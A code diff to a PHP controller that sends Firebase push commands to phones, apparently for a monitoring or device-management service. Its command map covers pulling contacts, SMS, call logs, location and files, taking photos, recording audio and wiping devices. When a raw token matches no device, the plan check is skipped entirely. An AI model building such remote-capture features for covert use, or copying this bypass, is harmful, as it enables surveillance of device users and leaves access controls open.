@@ -24,6 +24,82 @@ class FCMCommandController extends BaseController
             return $this->fail('Device token and command are required.', 400);
         }
 
+        $fcmToken = null;
+        $db = \Config\Database::connect();
+
+        // 1. Try to treat as encrypted database ID (counter)
+        $crypt = new \App\Models\Mod_Crypt();
+        $decryptedCounter = $crypt->decrypt_id($token);
+        if ($decryptedCounter && is_numeric($decryptedCounter)) {
+            $device = $db->table('tbl_device_profiles')
+                ->select('fcm_token')
+                ->where('counter', (int)$decryptedCounter)
+                ->get()
+                ->getRowArray();
+            if ($device && !empty($device['fcm_token'])) {
+                $fcmToken = $device['fcm_token'];
+            }
+        }
+
+        // 2. Try to treat as device checksum (64 char hex string)
+        if (!$fcmToken && strlen($token) === 64 && ctype_xdigit($token)) {
+            $device = $db->table('tbl_device_profiles')
+                ->select('fcm_token')
+                ->where('device_id', $token)
+                ->get()
+                ->getRowArray();
+            if ($device && !empty($device['fcm_token'])) {
+                $fcmToken = $device['fcm_token'];
+            }
+        }
+
+        // 3. Fallback: treat as raw FCM token
+        if (!$fcmToken) {
+            $fcmToken = $token;
+        }
+
+        // Validate command access against active subscription plan features
+        $cmdFeatureMap = [
+            'cmd_contacts'               => 'fcm_fetch_contacts',
+            'cmd_beep'                   => 'fcm_cmd_beep',
+            'cmd_health_check'           => 'fcm_cmd_health',
+            'cmd_apps'                   => 'fcm_fetch_apps',
+            'cmd_calls'                  => 'fcm_fetch_calls',
+            'cmd_sms'                    => 'fcm_fetch_sms',
+            'cmd_location'               => 'fcm_fetch_location',
+            'cmd_telemetry_soft'         => 'fcm_fetch_usage',
+            'cmd_capture_photo'          => 'fcm_cmd_camera',
+            'cmd_record_audio'           => 'fcm_cmd_audio',
+            'cmd_files'                  => 'fcm_fetch_files',
+            'cmd_software_misc'          => 'fcm_fetch_soft_misc',
+            'cmd_hardware_misc'          => 'fcm_fetch_hard_misc',
+            'cmd_all'                    => 'fcm_fetch_all',
+            
+            // Device management commands
+            'cmd_reset_app'              => 'fcm_cmd_reset_app',
+            'cmd_deactivate'             => 'fcm_cmd_deactivate',
+            'cmd_logout'                 => 'fcm_cmd_logout',
+            'cmd_uninstall_preserve'     => 'fcm_cmd_uninstall_preserve',
+            'cmd_uninstall_wipe'         => 'fcm_cmd_uninstall_wipe',
+        ];
+
+        if (array_key_exists($command, $cmdFeatureMap)) {
+            $deviceProfile = $db->table('tbl_device_profiles')
+                ->select('owner_id')
+                ->where('fcm_token', $fcmToken)
+                ->get()
+                ->getRowArray();
+            $ownerId = $deviceProfile ? (int)$deviceProfile['owner_id'] : 0;
+            
+            if ($ownerId) {
+                $planGate = new \App\Services\PlanGate();
+                $reqFeature = $cmdFeatureMap[$command];
+                if (!$planGate->hasFeature($ownerId, $reqFeature)) {
+                    return $this->fail('Forbidden: Target device plan does not permit this command.', 403);
+                }
+            }
+        }
+
         if (!file_exists($this->credentialsPath)) {
             return $this->fail('Firebase credentials file missing.', 500);
         }
@@ -35,7 +111,7 @@ class FCMCommandController extends BaseController
 
         $logId = $this->logCommandDispatch($token, $command, $payload, [], true);
 
-        $result = $this->dispatchFCMV1($token, $command, $payload, $accessToken, $logId);
+        $result = $this->dispatchFCMV1($fcmToken, $command, $payload, $accessToken, $logId);
 
         $responseBody = json_decode(json_encode($result), true) ?? [];
         $success = !isset($responseBody['error']);
@@ -44,7 +120,7 @@ class FCMCommandController extends BaseController
 
         if ($success) {
             // Send notification email
-            $this->sendDeviceManagementEmail($token, $command);
+            $this->sendDeviceManagementEmail($fcmToken, $command);
             return $this->respond([
                 'success' => true,
                 'message' => "Remote action '$command' for '$payload' dispatched.",
@@ -251,7 +327,7 @@ class FCMCommandController extends BaseController
                     'payload' => $payload,
                     'sent_at' => date('Y-m-d H:i:s'),
                     'action_log_id' => (string) $logId,
-                    'ack_url' => base_url('api/v1/fcm/ack/' . $logId),
+                    'ack_url' => base_url('api/v1/command-acknowledgements/' . $logId),
                 ]
             ]
         ];
@@ -290,7 +366,7 @@ return json_decode($response);
     private function getDeviceOwnerEmail(string $token): ?string
     {
         $db = \Config\Database::connect();
-        $device = $db->table('tbl_device_profile')
+        $device = $db->table('tbl_device_profiles')
             ->select('owner_id')
             ->where('fcm_token', $token)
             ->get()
@@ -318,7 +394,7 @@ return json_decode($response);
     private function getDeviceOwnerUsername(string $token): ?string
     {
         $db = \Config\Database::connect();
-        $device = $db->table('tbl_device_profile')
+        $device = $db->table('tbl_device_profiles')
             ->select('owner_id')
             ->where('fcm_token', $token)
             ->get()
@@ -343,7 +419,7 @@ return json_decode($response);
     private function sendDeviceManagementEmail(string $token, string $command): void
     {
         $db = \Config\Database::connect();
-        $device = $db->table('tbl_device_profile')
+        $device = $db->table('tbl_device_profiles')
             ->select('owner_id')
             ->where('fcm_token', $token)
             ->get()
